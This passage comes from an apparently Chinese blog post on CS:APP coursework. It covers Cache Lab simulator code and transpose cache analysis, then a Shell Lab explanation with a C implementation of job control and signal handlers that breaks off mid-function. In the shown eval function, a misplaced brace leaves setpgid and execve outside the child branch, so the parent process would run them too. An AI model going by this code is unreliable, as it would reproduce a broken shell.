class="comment">//it is not used this time</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;  <span class="comment">// don&#x27;t need eviction</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != emptyIndex)&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125; </span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;<span class="comment">//one hit                        </span></span><br><span class="line">        hit_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tempLRU_count = cache-&gt;sets[setIndex].lines[hitIndex].LRU_count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != hitIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count &lt;  tempLRU_count) &#123;<span class="comment">//less than the hit one&#x27;s LRU</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">                cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;<span class="comment">// the hit one&#x27;s LRU is set to zero</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">//store is just like a load</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">// a write is just like one load then one store</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">    store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span> </span>&#123;</span><br><span class="line">	FILE *file;                        <span class="comment">// pointer to FILE object </span></span><br><span class="line">	file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> type;                          <span class="comment">// L-load S-store M-modify </span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> address;              <span class="comment">// 64-bit  memory address </span></span><br><span class="line">	<span class="keyword">int</span> size;                           <span class="comment">//number of bytes accessed by operation </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> tag_move_bits = b + s;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %lx,%d&quot;</span>, &amp;type, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;<span class="comment">//for every line in the file</span></span><br><span class="line">		<span class="keyword">if</span> (type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">//if it is an instruction, do nothing</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">int</span> tag = address &gt;&gt; tag_move_bits;<span class="comment">//get the tag</span></span><br><span class="line">			<span class="keyword">int</span> setIndex = (address &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);<span class="comment">//get the index</span></span><br><span class="line">			<span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;<span class="comment">//print detailed info</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>, type, address, size);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (type == <span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line">				store(cache, setIndex, tag, verbosity);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (type == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">				modify(cache, setIndex, tag, verbosity);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (type== <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">				load(cache, setIndex, tag, verbosity);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(file);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h4><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p>
<p><strong>在该实验中</strong>，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p>
<ol>
<li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li>
<li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li>
</ol>
<p>代码见GitHub。</p>
<blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</a></p>
</blockquote>
<h3 id="Shell-Lab"><a href="#Shell-Lab" class="headerlink" title="Shell Lab"></a>Shell Lab</h3><p>任务：</p>
<ul>
<li><p>eval: 主要功能是解析cmdline，并且运行. [70 lines]</p>
</li>
<li><p>builtin cmd: 辨识和解析出bulidin命令: quit, fg, bg, and jobs. [25lines]</p>
</li>
<li><p>do bgfg: 实现bg和fg命令. [50 lines]</p>
</li>
<li><p>waitfg: 实现等待前台程序运行结束. [20 lines]</p>
</li>
<li><p>sigchld handler: 响应SIGCHLD. 80 lines]</p>
</li>
<li><p>sigint handler: 响应 SIGINT (ctrl-c) 信号. [15 lines]</p>
</li>
<li><p>sigtstp handler: 响应 SIGTSTP (ctrl-z) 信号. [15 lines]</p>
</li>
</ul>
<p>给出的函数：</p>
<ul>
<li><code>int parseline(const char *cmdline,char **argv)</code>：获取参数列表<code>char **argv</code>，返回是否为后台运行命令（<code>true</code>）。</li>
<li><code>void clearjob(struct job_t *job)</code>：清除<code>job</code>结构。</li>
<li><code>void initjobs(struct job_t *jobs)</code>：初始化<code>jobs</code>链表。</li>
<li><code>void maxjid(struct job_t *jobs)</code>：返回<code>jobs</code>链表中最大的<code>jid</code>号。</li>
<li><code>int addjob(struct job_t *jobs,pid_t pid,int state,char *cmdline)</code>：在<code>jobs</code>链表中添加<code>job</code></li>
<li><code>int deletejob(struct job_t *jobs,pid_t pid)</code>：在<code>jobs</code>链表中删除<code>pid</code>的<code>job</code>。</li>
<li><code>pid_t fgpid(struct job_t *jobs)</code>：返回当前前台运行<code>job</code>的<code>pid</code>号。</li>
<li><code>struct job_t *getjobpid(struct job_t *jobs,pid_t pid)</code>：返回<code>pid</code>号的<code>job</code>。</li>
<li><code>struct job_t *getjobjid(struct job_t *jobs,int jid)</code>：返回<code>jid</code>号的<code>job</code>。</li>
<li><code>int pid2jid(pid_t pid)</code>：将<code>pid</code>号转化为<code>jid</code>。</li>
<li><code>void listjobs(struct job_t *jobs)</code>：打印<code>jobs</code>。</li>
<li><code>void sigquit_handler(int sig)</code>：处理<code>SIGQUIT</code>信号。</li>
</ul>
<p>tsh应有的内置命令：</p>
<ul>
<li>quit: 退出当前shell</li>
<li>jobs: 列出所有后台运行的工作</li>
<li>bg <job>: 这个命令将会向<job>代表的工作发送SIGCONT信号并放在后台运行，<job>可以是一个PID也可以是一个JID（job ID）。</li>
<li>fg <job>: 这个命令会向<job>代表的工作发送SIGCONT信号并放在前台运行，<job>可以是一个PID也可以是一个JID</li>
</ul>
<blockquote>
<p>信号阻塞：</p>
<p>执行信号的处理动作成为信号递达（Delivery），信号从产生到递达之间的状态称为信号未决(Pending)。进程可以选择阻塞(Block)某个信号。<br>被阻塞的信号产生时将保持在未决状态，直到进程解除对此信号的阻塞，才执行递达的动作<br>注意：阻塞和忽略是不同的，只要信号被阻塞就不会递达，而忽略是在递达之后可选的一种处理动作<br>信号不会丢失，如果信号被阻塞，只会保持信号未决，但是信号不丢失</p>
</blockquote>
<p>对用户输入的参数进行解析并运行计算。书上已经给了 demo，我们优化一下即可。</p>
<p>有以下几点需要注意：</p>
<ul>
<li><code>SIGCHLD</code>信号：只要有一个子进程终止或者停止，内核就会发送一个 <code>SIGHLD</code>信号给父进程。</li>
<li>信号是不排队的。如果返回信号时，发现目的进程正在执行信号处理，那么该信号则会被阻塞，下一个则会被丢弃。因此，不能用信号来对其他进程中发生的事件计数。</li>
<li><strong>条件竞争</strong>：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。本例情况是，如果在<strong>父进程</strong>能够再次运行之前，子进程终止，返回信号，而此时父进程还没执行 <code>addjob</code>，而信号处理回收子进程，执行 <code>deletejob</code>，由于还没添加到列表，所以这个函数什么都做不了，而这结束后父进程又会添加子进程，而产生一个永远不会被删除的job。</li>
</ul>
<p>代码参考tshref 源码：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c">https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">int</span> state = UNDEF;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">//解析命令</span></span><br><span class="line">    <span class="keyword">if</span>(bg == <span class="number">1</span>) &#123; <span class="comment">//判断是否在后台</span></span><br><span class="line">        state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state = FG;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)  &#123; <span class="keyword">return</span>; &#125;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all); <span class="comment">//防止竞争</span></span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD); <span class="comment">// ignore the SIGHLD</span></span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//block SIGHLD and save previous blocked set</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;  <span class="comment">//如果不是内置命令</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//Restore previous blocked set, unblocking SIGHLD</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// change the group id into pid</span></span><br><span class="line">            perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, state, cmdline);  <span class="comment">//add job</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(state == FG) &#123; <span class="comment">// if FG wait until finsihed else just print message</span></span><br><span class="line">        waitfg(pid);  <span class="comment">//等待前台程序执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123; <span class="comment">// 如果是内置命令则直接执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">//print the jobs</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parsed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// case no argument</span></span><br><span class="line">    <span class="keyword">if</span>(!argv[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse argument，其中%开头的数字是JobID，纯数字的是PID</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobjid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// make state BG</span></span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="comment">// wait until finish</span></span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do_bgfg: Internal error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123; <span class="comment">//等待子进程结束</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while there is no FG process sleep</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verbose message</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid to find pid</span></span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if job deleted </span></span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, pid)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Lost track of (%d)\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="comment">// stop signal</span></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="keyword">if</span>(deletejob(jobs, pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n&quot;</span>, jid, pid, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit by signal</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span 